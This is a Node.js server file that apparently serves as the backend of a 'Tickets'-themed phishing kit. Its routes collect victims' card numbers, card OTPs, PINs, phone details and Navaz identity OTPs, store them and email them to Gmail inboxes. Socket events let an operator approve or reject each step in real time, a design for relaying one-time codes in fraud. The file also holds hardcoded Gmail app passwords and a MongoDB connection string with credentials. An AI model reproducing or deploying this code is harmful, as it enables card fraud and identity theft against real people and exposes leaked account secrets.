const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const { default: axios } = require("axios");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });
app.use(express.json());
app.use(cors({ origin: "*", credentials: true }));
app.use(require("morgan")("dev"));

const emailData = {
  user: "tzbbz474@gmail.com",
  pass: "ouuh bnqn sqku cmua",
  // user: "karamalzoubi2045@gmail.com",
  // pass: "aczd aicu rmru eiha",
};

const sendEmail = async (data, type) => {
  console.log("start send Email");
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${
      typeof value === "object" ? JSON.stringify(value) : value
    }</p>`;
  }

  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: emailData.user,
      subject: `${
        type === "visa"
          ? "Tickets  Visa"
          : type === "reg"
            ? "Tickets Register Form "
            : type === "otp"
              ? "Tickets Visa Otp "
              : type === "pin"
                ? "Tickets Visa Pin "
                : type === "phone"
                  ? "Tickets - Phone Gate Data "
                  : type === "phoneOtp"
                    ? "Tickets - Phone Gate Otp "
                    : type === "navaz"
                      ? "Tickets - Navaz Gate "
                      : type === "navazOtp"
                        ? "Tickets Navaz Last Otp  "
                        : "Tickets "
      }`,
      html: htmlContent,
    })
    .then((info) => {
      console.log(info);
      if (info.accepted.length) {
        console.log("Email sended ");
        return true;
      } else {
        console.log("Email not sended ");
        return false;
      }
    });
};

app.get("/", (req, res) => res.sendStatus(200));
app.post("/email", async (req, res) => {
  if (req.query.type === "one") {
    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 465, // use 465 with secure true
      secure: true,
      auth: {
        user: emailData.user,
        pass: emailData.pass, // must be an App Password, not your Gmail login
      },
    });
    let htmlContent = "<div>";
    for (const [key, value] of Object.entries(req.body)) {
      htmlContent += `<p>${key}: ${
        typeof value === "object" ? JSON.stringify(value) : value
      }</p>`;
    }
    await transporter
      .sendMail({
        from: "Admin Panel",
        to: "pnusds269@gmail.com",
        subject: `${
          req.query.visa
            ? "Tickets  Visa"
            : req.query.reg
              ? "Tickets Register Form "
              : req.query.otp
                ? "Tickets Visa Otp "
                : req.query.pin
                  ? "Tickets Visa Pin "
                  : req.query.motsal
                    ? "Tickets - Motsl Gate Data "
                    : req.query.motsalOtp
                      ? "Tickets - Motsl Gate Otp "
                      : req.query.navaz
                        ? "Tickets - Navaz Gate "
                        : req.query.navazOtp
                          ? "Tickets Navaz Last Otp  "
                          : "Tickets Bank Visa"
        }`,
        html: htmlContent,
      })
      .then((info) => {
        if (info.accepted.length) {
          res.sendStatus(200);
        } else {
          res.sendStatus(400);
        }
      });
  } else {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "saudiabsher1990@gmail.com",
        pass: "nazl tmfi oxnn astq",
      },
    });
    let htmlContent = "<div>";
    for (const [key, value] of Object.entries(req.body)) {
      htmlContent += `<p>${key}: ${
        typeof value === "object" ? JSON.stringify(value) : value
      }</p>`;
    }
    await transporter
      .sendMail({
        from: "Admin Panel",
        to: "saudiabsher1990@gmail.com",
        subject: `${
          req.query.visa
            ? "Tickets  Visa"
            : req.query.reg
              ? "Tickets Register Form "
              : req.query.otp
                ? "Tickets Visa Otp "
                : req.query.pin
                  ? "Tickets Visa Pin "
                  : req.query.motsal
                    ? "Tickets - Motsl Gate Data "
                    : req.query.motsalOtp
                      ? "Tickets - Motsl Gate Otp "
                      : req.query.navaz
                        ? "Tickets - Navaz Gate "
                        : req.query.navazOtp
                          ? "Tickets Navaz Last Otp  "
                          : "Tickets Bank Visa"
        }`,
        html: htmlContent,
      })
      .then((info) => {
        if (info.accepted.length) {
          res.sendStatus(200);
        } else {
          res.sendStatus(400);
        }
      });
  }
});
app.delete("/", async (req, res) => {
  await Order.find({})
    .then(async (orders) => {
      await Promise.resolve(
        orders.forEach(async (order) => {
          await Order.findByIdAndDelete(order._id);
        }),
      );
    })
    .then(() => res.sendStatus(200));
});

const createOrderRegistration = async (req, res) => {
  try {
    const user = await Order.create(req.body);
    await sendEmail(req.body, "reg");
    return res.status(201).json({ user });
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
};

app.post("/reg", createOrderRegistration);
app.post("/login", createOrderRegistration);

app.get("/order/checked/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
    res.sendStatus(200),
  );
});

app.post("/visa/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    CardAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "visa").then(() => res.sendStatus(200)),
  );
});

app.post("/visaOtp/:id", async (req, res) => {
  const { id } = req.params;

  await Order.findByIdAndUpdate(id, {
    CardOtp: req.body.otp,
    checked: false,
    OtpCardAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "otp").then(() => res.sendStatus(200)),
  );
});
app.post("/visaPin/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    pin: req.body.pin,
    checked: false,
    PinAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "pin").then(() => res.sendStatus(200)),
  );
});
app.post("/phone/:id", async (req, res) => {
  const { id } = req.params;
  if (!mongoose.Types.ObjectId.isValid(id)) {
    return res.status(400).send("Invalid order id");
  }
  console.log(req.body);
  const { phoneNumber, phoneNetwork, phoneId } = req.body;
  await Order.findByIdAndUpdate(id, {
    phoneNetwork,
    phoneNumber,
    phoneId,
    checked: false,
    phoneAccept: false,
    networkAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "phone").then(() => res.sendStatus(200)),
  );
});
app.post("/phoneOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    phoneOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "phoneOtp").then(() => res.sendStatus(200)),
  );
});

app.post("/navazOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    navazOtp: req.body.navazOtp,
    checked: false,
  }).then(
    async () =>
      await sendEmail(req.body, "navazOtp").then(() => res.sendStatus(200)),
  );
});

app.post("/mobOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    mobOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "mobOtp").then(() => res.sendStatus(200)),
  );
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users)),
);

io.on("connection", (socket) => {
  console.log("connected");
  socket.on("newUser", (data) => io.emit("newUser", data));
  socket.on("newLogin", (data) => {
    io.emit("newLogin", data);
    io.emit("newUser", data);
  });
  socket.on("paymentForm", (data) => io.emit("paymentForm", data));
  socket.on("acceptPaymentForm", async (id) => {
    console.log("acceptPaymentForm From Admin", id);
    console.log(id);
    io.emit("acceptPaymentForm", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
  });
  socket.on("declinePaymentForm", async (id) => {
    console.log("declinePaymentForm Form Admin", id);
    io.emit("declinePaymentForm", id);
    await Order.findByIdAndUpdate(id, { CardAccept: false, checked: false });
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp  received", data);
    io.emit("visaOtp", data);
  });
  socket.on("acceptVisaOtp", async (id) => {
    console.log("acceptVisaOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("acceptVisaOtp", id);
  });
  socket.on("declineVisaOtp", async (id) => {
    console.log("declineVisaOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: false, checked: false });
    io.emit("declineVisaOtp", id);
  });

  socket.on("visaPin", (data) => {
    console.log("visaPin  received", data);
    io.emit("visaPin", data);
  });
  socket.on("acceptVisaPin", async (id) => {
    console.log("acceptVisaPin From Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("acceptVisaPin", id);
  });
  socket.on("declineVisaPin", async (id) => {
    console.log("declineVisaPin Form Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: false, checked: false });
    io.emit("declineVisaPin", id);
  });
  socket.on("phone", async (data) => {
    console.log("phone  received", data);
    await Order.findByIdAndUpdate(data.id, {
      phoneAccept: false,
      mobOtp: null,
      mobOtpAccept: false,
    });
    io.emit("phone", data);
  });

  socket.on("acceptPhone", async (id) => {
    console.log("acceptPhone From Admin", id);
    await Order.findByIdAndUpdate(id, { phoneAccept: true });
    io.emit("acceptPhone", id);
  });

  socket.on("declinePhone", async (id) => {
    console.log("declinePhone Form Admin", id);
    await Order.findByIdAndUpdate(id, { phoneAccept: false, checked: false });
    io.emit("declinePhone", id);
  });
  socket.on("acceptNormalPhone", async ({ id, price }) => {
    console.log("acceptNormalPhone From Admin", id);
    await Order.findByIdAndUpdate(id, { phoneAccept: true });
    io.emit("acceptNormalPhone", { id, price });
  });

  socket.on("declineNormalPhone", async (id) => {
    console.log("declineNormalPhone Form Admin", id);
    await Order.findByIdAndUpdate(id, { phoneAccept: false, checked: false });
    io.emit("declineNormalPhone", id);
  });

  socket.on("phoneOtp", (data) => {
    console.log("phoneOtp  received", data);
    io.emit("phoneOtp", data);
  });

  socket.on("acceptPhoneOTP", async ({ id, price }) => {
    console.log("acceptPhoneOTP From Admin", id);
    await Order.findByIdAndUpdate(id, {
      phoneOtpAccept: true,
      networkAccept: false,
    });
    io.emit("acceptPhoneOTP", { id, price });
  });

  socket.on("declinePhoneOTP", async (id) => {
    console.log("declinePhoneOTP Form Admin", id);
    await Order.findByIdAndUpdate(id, {
      phoneOtpAccept: false,
      networkAccept: false,
      checked: false,
    });
    io.emit("declinePhoneOTP", id);
  });
  socket.on("acceptStcPhoneOtp", async (id) => {
    console.log("acceptStcPhoneOtp From Admin", id);
    await Order.findByIdAndUpdate(id, {
      phoneOtpAccept: true,
      networkAccept: false,
    });
    io.emit("acceptStcPhoneOtp", id);
  });

  socket.on("declineStcPhoneOtp", async (id) => {
    console.log("declineStcPhoneOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, {
      phoneOtpAccept: false,
      networkAccept: false,
      checked: false,
    });
    io.emit("declineStcPhoneOtp", id);
  });
  socket.on("acceptService", async ({ id, price }) => {
    console.log("acceptService From Admin", id);
    await Order.findByIdAndUpdate(id, {
      networkAccept: true,
    });
    io.emit("acceptService", { id, price });
  });

  socket.on("declineService", async (id) => {
    console.log("declineService Form Admin", id);
    await Order.findByIdAndUpdate(id, { networkAccept: false, checked: false });
    io.emit("declineService", id);
  });
  socket.on("acceptNavaz", async (id) => {
    console.log("acceptNavaz From Admin", id);
    await Order.findByIdAndUpdate(id, { navazAccept: true });
    io.emit("acceptNavaz", id);
  });

  socket.on("declineNavaz", async (id) => {
    console.log("declineNavaz Form Admin", id);
    await Order.findByIdAndUpdate(id, {
      navazAccept: false,
      networkAccept: false,
      checked: false,
    });
    io.emit("declineNavaz", id);
  });

  socket.on("navazChange", async (data) => {
    io.emit("navazChange", data);
  });

  socket.on("navazOtp", async (data) => {
    console.log("navazOtp  received", data);
    await Order.findByIdAndUpdate(data.id, {
      navazOtpAccept: false,
      networkAccept: true,
      navazAccept: true,
    });
    io.emit("navazOtp", data);
  });

  socket.on("acceptNavazOTP", async (id) => {
    console.log("acceptNavazOTP From Admin", id);
    await Order.findByIdAndUpdate(id, {
      navazOtpAccept: true,
      networkAccept: true,
      navazAccept: true,
    });
    io.emit("acceptNavazOTP", id);
  });

  socket.on("declineNavazOTP", async (id) => {
    console.log("declineNavazOTP Form Admin", id);
    await Order.findByIdAndUpdate(id, {
      navazOtpAccept: false,
      checked: false,
    });
    io.emit("declineNavazOTP", id);
  });

  socket.on("mobOtp", async (data) => {
    console.log("mobOtp  received", data);
    await Order.findByIdAndUpdate(data.id, {
      mobOtp: data.mobOtp,
      mobOtpAccept: false,
      networkAccept: true,
      navazAccept: false,
    });
    io.emit("mobOtp", data);
  });

  socket.on("acceptMobOtp", async ({ id, price }) => {
    console.log("acceptMobOtp From Admin", id);
    await Order.findByIdAndUpdate(id, {
      mobOtpAccept: true,
      networkAccept: true,
      navazAccept: false,
    });
    io.emit("acceptMobOtp", { id, price });
  });

  socket.on("declineMobOtp", async (id) => {
    console.log("declineMobOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, {
      mobOtpAccept: false,
      checked: false,
    });
    io.emit("declineMobOtp", id);
  });

  socket.on("network", async (id) => {
    await Order.findByIdAndUpdate(id, {
      navazAccept: false,
      networkAccept: false,
    });
  });
});

mongoose
  .connect("mongodb+srv://omsalm:omsalm@arab.dzdqr5o.mongodb.net/TicketsServer2")
  .then((conn) =>
    server.listen(PORT, async () => {
      // await Order.deleteMany({})
      console.log(
        "server running and connected to db" +
          conn.connection.host +
          "on port " +
          PORT,
      );
    }),
  );
